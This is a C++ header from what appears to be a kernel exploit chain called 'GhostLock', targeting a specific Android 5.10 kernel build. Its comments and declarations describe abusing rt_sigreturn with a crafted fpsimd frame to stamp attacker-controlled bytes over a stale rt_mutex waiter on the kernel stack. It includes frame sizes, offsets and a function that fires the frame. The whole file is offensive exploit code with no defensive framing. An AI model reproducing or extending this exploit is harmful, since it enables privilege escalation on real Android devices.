/*
 * GhostLock — sigreturn fpsimd stack stamp (katyusha / 5.10.101 MP6).
 *
 * The multicast stamp delivery is replaced on kernels where the IPv4
 * msfilter copy window cannot reach the stale rt_mutex waiter. The payload
 * bytes are unchanged (encode_multicast_waiter writes task/lock at
 * waiter_off+task_offset / waiter_off+lock_offset); only the delivery syscall
 * differs: rt_sigreturn restores a crafted fpsimd_context whose kernel-side
 * user_fpsimd_state buffer sits at the stack depth that covers the waiter.
 *
 * Geometry evidence and frame constants: MP6-kernel-analysis/
 * MP6-alt-route-audit.md (replay_alt_route_audit.py). All offsets below are
 * for 5.10.101-android12-9-gece0cc04d1a5 and are asserted there.
 */
#ifndef GHOSTLOCK_ROUTE_SIGRETURN_STAMP_H
#define GHOSTLOCK_ROUTE_SIGRETURN_STAMP_H

#include <cstddef>
#include <cstdint>

namespace ghostlock::route {
    /* rt_sigframe access_ok budget checked by __arm64_sys_rt_sigreturn. */
    inline constexpr size_t kSigStampFrameBytes = 0x1250;

    /* user_fpsimd_state-shaped stamp: vregs[32] (512B), fpsr (4B), fpcr (4B).
     * Bytes beyond 520 are not delivered (the kernel buffer tail stays zero). */
    inline constexpr size_t kSigStampDeliveredBytes = 520;

    /* Build the rt_sigframe at `frame` (kSigStampFrameBytes, 16-aligned,
     * zeroed here). The stamp's 520 delivered bytes land at the kernel stack
     * window that covers waiter+0x30/0x38 for waiter_off=320. `blocked_mask`
     * is restored verbatim as uc_sigmask before the copy runs. */
    void build_sigreturn_stamp_frame(uint8_t *frame, const unsigned char *stamp,
                                     size_t stamp_size, uint64_t blocked_mask);

    /* Current thread's blocked signal set (8-byte arm64 sigset). */
    uint64_t current_blocked_sigmask();

    /* Fire rt_sigreturn with pt_regs->sp = frame. Control resumes at the
     * caller with x0 == 0 exactly like a normal call; a frame that fails any
     * kernel check kills the thread with SIGSEGV instead of returning. */
    extern "C" void ghostlock_fire_sigreturn_stamp(void *frame);
} // namespace ghostlock::route

#endif
